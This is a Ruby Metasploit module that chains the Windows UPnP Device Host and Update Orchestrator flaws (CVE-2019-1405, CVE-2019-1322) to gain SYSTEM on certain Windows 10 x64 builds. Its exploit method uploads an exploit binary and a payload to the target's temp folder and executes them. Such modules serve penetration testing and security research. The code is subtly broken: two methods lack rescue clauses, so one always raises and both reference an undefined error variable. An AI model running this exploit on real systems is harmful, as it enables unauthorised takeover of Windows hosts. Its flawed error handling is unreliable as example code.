# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;
require &#039;msf/core/post/windows/priv&#039;
require &#039;msf/core/post/windows/registry&#039;
require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Microsoft UPnP Local Privilege Elevation Vulnerability&#039;,
      &#039;Description&#039;    => %q(
      This exploit uses two vulnerabilities to execute a command as an elevated user.
      The first (CVE-2019-1405) uses the UPnP Device Host Service to elevate to
      NT AUTHORITY\LOCAL SERVICE
      The second (CVE-2019-1322) leverages the Update Orchestrator Service to
      elevate from NT AUTHORITY\LOCAL SERVICE to NT AUTHORITY\SYSTEM.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;NCC Group&#039;,            # Original discovery (https://www.nccgroup.trust/uk/)
          &#039;hoangprod&#039;,            # PoC
          &#039;bwatters-r7&#039;           # msf module
        ],
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Targets&#039;        =>
        [
          [&#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X64 }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 12 2019&#039;,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-1322&#039;],
          [&#039;CVE&#039;, &#039;2019-1405&#039;],
          [&#039;EDB&#039;, &#039;47684&#039;],
          [&#039;URL&#039;, &#039;https://github.com/apt69/COMahawk&#039;],
          [&#039;URL&#039;, &#039;https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/&#039;],
          [&#039;URL&#039;, &#039;https://fortiguard.com/threat-signal-report/3243/new-proof-of-concept-combining-cve-2019-1322-and-cve-2019-1405-developed-1&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;DisablePayloadHandler&#039; => false
        }
    ))

    register_options([
      OptString.new(&#039;EXPLOIT_NAME&#039;,
        [false, &#039;The filename to use for the exploit binary (%RAND% by default).&#039;, nil]),
      OptString.new(&#039;PAYLOAD_NAME&#039;,
        [false, &#039;The filename for the payload to be used on the target host (%RAND%.exe by default).&#039;, nil]),
      OptString.new(&#039;WRITABLE_DIR&#039;,
        [false, &#039;Path to write binaries (%TEMP% by default).&#039;, nil]),
      OptInt.new(&#039;EXPLOIT_TIMEOUT&#039;,
        [true, &#039;The number of seconds to wait for exploit to finish running&#039;, 60]),
      OptInt.new(&#039;EXECUTE_DELAY&#039;,
        [true, &#039;The number of seconds to delay between file upload and exploit launch&#039;, 3])
    ])
  end

  def exploit
    exploit_name = datastore[&#039;EXPLOIT_NAME&#039;] || Rex::Text.rand_text_alpha(6..14)
    payload_name = datastore[&#039;PAYLOAD_NAME&#039;] || Rex::Text.rand_text_alpha(6..14)
    exploit_name = "#{exploit_name}.exe" unless exploit_name.end_with?(&#039;.exe&#039;)
    payload_name = "#{payload_name}.exe" unless payload_name.end_with?(&#039;.exe&#039;)
    temp_path = datastore[&#039;WRITABLE_DIR&#039;] || session.sys.config.getenv(&#039;TEMP&#039;)
    payload_path = "#{temp_path}\\#{payload_name}"
    exploit_path = "#{temp_path}\\#{exploit_name}"
    payload_exe = generate_payload_exe

    # Check target
    vprint_status("Checking Target")
    validate_active_host
    validate_target
    fail_with(Failure::BadConfig, "#{temp_path} does not exist on the target") unless directory?(temp_path)

    # Upload Exploit
    vprint_status("Uploading exploit to #{sysinfo[&#039;Computer&#039;]} as #{exploit_path}")
    ensure_clean_destination(exploit_path)
    exploit_bin = exploit_data(&#039;cve-2019-1322&#039;, &#039;CVE-2019-1322-EXE.exe&#039;)
    write_file(exploit_path, exploit_bin)
    print_status("Exploit uploaded on #{sysinfo[&#039;Computer&#039;]} to #{exploit_path}")

    # Upload Payload
    vprint_status("Uploading Payload")
    ensure_clean_destination(payload_path)
    write_file(payload_path, payload_exe)
    print_status("Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo[&#039;Computer&#039;]} to #{payload_path}")
    print_warning("This exploit requires manual cleanup of the payload #{payload_path}")

    # Run Exploit
    vprint_status("Running Exploit")
    print_status("It may take a moment after the session is established for the exploit to exit safely.")
    begin
      cmd_exec(&#039;cmd.exe&#039;, "/c #{exploit_path} #{payload_path}", 60)
    rescue Rex::TimeoutError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      print_error("Caught timeout.  Exploit may be taking longer or it may have failed.")
    end
    vprint_status("Cleaning up #{exploit_path}")
    ensure_clean_destination(exploit_path)
  end

  def validate_active_host
    begin
      print_status("Attempting to PrivEsc on #{sysinfo[&#039;Computer&#039;]} via session ID: #{datastore[&#039;SESSION&#039;]}")
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      raise Msf::Exploit::Failed, &#039;Could not connect to session&#039;
    end
  end

  def validate_target
    if sysinfo[&#039;Architecture&#039;] == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Exploit code is 64-bit only&#039;)
    end
    sysinfo_value = sysinfo[&#039;OS&#039;]
    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
    vprint_status("Build Number = #{build_num}")
    unless sysinfo_value =~ /10/ && (build_num > 17133 && build_num < 18362)
      fail_with(Failure::NotVulnerable, &#039;The exploit only supports Windows 10 build versions 17133-18362&#039;)
    end
  end

  def ensure_clean_destination(path)
    return unless file?(path)
    print_status("#{path} already exists on the target. Deleting...")
    begin
      file_rm(path)
      print_status("Deleted #{path}")
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      print_error("Unable to delete #{path}")
    end
  end
end

